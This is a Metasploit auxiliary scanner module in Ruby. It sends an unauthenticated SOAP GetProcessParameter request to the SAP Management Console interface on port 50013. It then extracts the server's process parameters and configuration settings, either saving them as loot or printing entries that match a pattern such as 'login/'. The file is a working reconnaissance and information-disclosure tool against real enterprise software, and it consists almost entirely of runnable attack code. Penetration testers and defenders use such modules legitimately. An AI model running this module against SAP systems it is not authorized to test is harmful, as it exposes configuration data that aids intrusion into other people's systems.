##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'SAP Management Console Get Process Parameters',
      'Description'  => %q{
        This module simply attempts to output a SAP process parameters and
        configuration settings through the SAP Management Console SOAP Interface.
        },
      'References'   =>
        [
          # General
          [ 'URL', 'http://blog.c22.cc' ]
        ],
      'Author'       => [ 'Chris John Riley' ],
      'License'      => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),
        OptString.new('MATCH', [false, 'Display matches e.g login/', '']),
      ])
    register_autofilter_ports([ 50013 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    getprocparam(ip)
  end

  def getprocparam(rhost)
    print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
    success = false
    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
    ns1 = 'ns1:GetProcessParameter'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi
    data << '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri'      => normalize_uri(target_uri.path),
        'method'   => 'POST',
        'data'     => data,
        'headers'  =>
          {
            'Content-Length' => data.length,
            'SOAPAction'     => '""',
            'Content-Type'   => 'text/xml; charset=UTF-8',
          }
      })

      unless res
        print_error("#{rhost}:#{rport} [SAP] Unable to connect")
        return
      end

      if res.code == 200
        case res.body
        when nil
          # Nothing
        when /<parameter>(.*)<\/parameter>/i
          body = []
          body = res.body
          success = true
        end
      elsif res
        case res.body
        when /<faultstring>(.*)<\/faultstring>/i
          faultcode = $1.strip
          fault = true
        end
      else
        print_error("#{rhost}:#{rport} [SAP] Unable to communicate with remote host.")
      end

    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
      return
    end

    if success
      # Only store loot if MATCH is not selected
      if datastore['MATCH'].blank?
        loot = store_loot(
          "sap.getprocessparameters",
          "text/xml",
          rhost,
          res.body,
          ".xml"
        )
        print_good("#{rhost}:#{rport} [SAP] Process Parameters: Entries extracted to #{loot}")
      else
        name_match = Regexp.new(datastore['MATCH'], [Regexp::EXTENDED, 'n'])
        print_status("[SAP] Regex match selected, skipping loot storage")
        print_status("#{rhost}:#{rport} [SAP] Attempting to display configuration matches for #{name_match}")

        saptbl = Msf::Ui::Console::Table.new(
          Msf::Ui::Console::Table::Style::Default,
        'Header'    => "[SAP] Process Parameters",
        'Prefix'    => "\n",
        'Indent'    => 1,
        'Columns'   =>
        [
          "Name",
          "Description",
          "Value"
        ])

        xmldata = REXML::Document.new(body)
        xmlpath = '/SOAP-ENV:Envelope/SOAP-ENV:Body/'
        xmlpath << '/SAPControl:GetProcessParameterResponse'
        xmlpath << '/parameter/item'
        xmldata.elements.each(xmlpath) do | ele |
          if not datastore['MATCH'].empty? and ele.elements["name"].text.match(/#{name_match}/)
            name = ele.elements["name"].text if not ele.elements["name"].nil?
            desc = ele.elements["description"].text if not ele.elements["description"].nil?
            desc = '' if desc.nil?
            val = ele.elements["value"].text if not ele.elements["value"].nil?
            val = '' if val.nil?
            saptbl << [ name, desc, val ]
          end
        end

        print_status("[SAP] Process Parameter Results for #{name_match}\n #{saptbl.to_s}") if not saptbl.to_s.empty?
      end

      return

    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
      return

    else
      # Something has gone horribly wrong
      print_error("#{rhost}:#{rport} [SAP] failed to request environment")
      return
    end
  end
end
